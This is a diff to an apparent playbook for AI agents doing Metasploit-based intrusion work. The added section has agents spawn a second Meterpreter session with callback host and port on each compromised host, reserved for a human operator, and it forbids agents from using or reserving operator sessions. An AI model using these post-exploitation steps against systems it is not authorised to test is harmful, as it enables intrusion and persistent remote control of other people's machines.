@@ -69,6 +69,27 @@ b. Verify alive: execute(session_id, command="getuid") — if it succeeds,
 c. Send [session-ready] with backend=metasploit
 ```
 
+**Spawn the operator's session (once per host, right after the foothold).**
+So the human operator can work the host in the live tmux msfconsole without
+fighting the agents over one shell, give them their own session:
+```
+mcp__metasploit-server__spawn_operator_session(session_id=<the raw SHELL
+   session you just caught, before/at upgrade time>, lhost=<callback>,
+   lport=<a port distinct from the agents' handlers, e.g. 4444>)
+```
+Do this from the **shell** session (it re-stages via shell_to_meterpreter);
+it spawns a second Meterpreter and reserves it for the operator. If the
+foothold is already Meterpreter (no shell to re-stage), the tool returns
+`needs_manual` — that's fine, skip it; the operator can reserve one themselves.
+The agents keep working the original session as normal.
+
+**Never drive an operator-reserved session.** `list_sessions()` marks reserved
+sessions `operator_reserved: true`, and every session tool
+(`execute`/`upload`/`download`/`kill_session`/…) refuses them with
+`error: operator_reserved`. If you get that error, you grabbed the operator's
+session — switch to another. Never `reserve_operator_session` /
+`release_operator_session` on your own initiative; those are operator calls.
+
 If the upgrade fails (download blocked, payload killed, port filtered):
 ```
 a. Fall back to shell-server: send [session-ready] with backend=shell-server
